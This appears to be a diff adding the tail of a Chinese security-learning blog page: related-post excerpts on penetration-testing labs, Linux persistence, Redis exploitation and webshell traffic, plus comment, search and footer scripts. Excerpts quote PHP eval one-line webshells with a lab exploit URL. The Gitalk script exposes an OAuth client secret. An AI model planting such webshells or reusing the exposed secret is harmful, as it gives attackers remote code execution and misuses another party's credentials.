+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 17日, 2023				
+							</p>
+							<p class="relate-post-content">
+								零、Linux下的控守技术概述控守技术可以理解为权限维持技术，泛指攻击者获取目标机器的控制权限后，将该权限长久维持的技术和方法
+这里主要分为两大类：
+
+权限维持：能够在失去当前控制权限时，下次能更容易地重获权限的方法
+痕迹隐藏：能够使...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux攻防-权限维持及痕迹隐藏"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/04/22/Redis-%E9%85%8D%E7%BD%AE-%E5%91%BD%E4%BB%A4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Redis-配置&命令&漏洞利用">
+								Redis-配置&命令&漏洞利用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 22日, 2023				
+							</p>
+							<p class="relate-post-content">
+								Redis配置路径：/etc/redis/redis.conf
+允许远程主机访问数据库：NETWORK一栏，注释掉bind 127.0.0.1 ::1同时设置protected-mode no
+说明是这样的：
+
+意思是Redis仅允许...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/04/22/Redis-%E9%85%8D%E7%BD%AE-%E5%91%BD%E4%BB%A4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Redis-配置&命令&漏洞利用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Redis.png" alt="Redis-配置&amp;命令&amp;漏洞利用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
+								sqli-labs Stacked Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 30日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
+								Web靶场-Pikachu			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
+环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/09/28/%E3%80%8APython-Guide%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="《Python Guide》学习笔记">
+								《Python Guide》学习笔记			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								九月 28日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Python Guide v1.0前言是对王炳明-Python Guide v1.0的学习笔记
+已经有一些Python基础但还是觉得没有系统化地构筑自己的知识库（要啥自己的知识库，直接翻官方文档不就好了吗）练习也偏少因此...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/09/28/%E3%80%8APython-Guide%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="《Python Guide》学习笔记">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Python.png" alt="《Python Guide》学习笔记"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/09/06/Python%E8%A3%85%E9%A5%B0%E5%99%A8/" title="Python装饰器">
+								Python装饰器			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								九月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Python装饰器学习资料：
+
+Python 函数装饰器
+装饰器类
+Python __call__()方法（详解版）
+
+基本概念先建立一个观点：函数本质上是一个对象，可以赋值给其他变量加上()后就变成执行函数本身，并获得...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/09/06/Python%E8%A3%85%E9%A5%B0%E5%99%A8/" title="Python装饰器">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Python.png" alt="Python装饰器"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
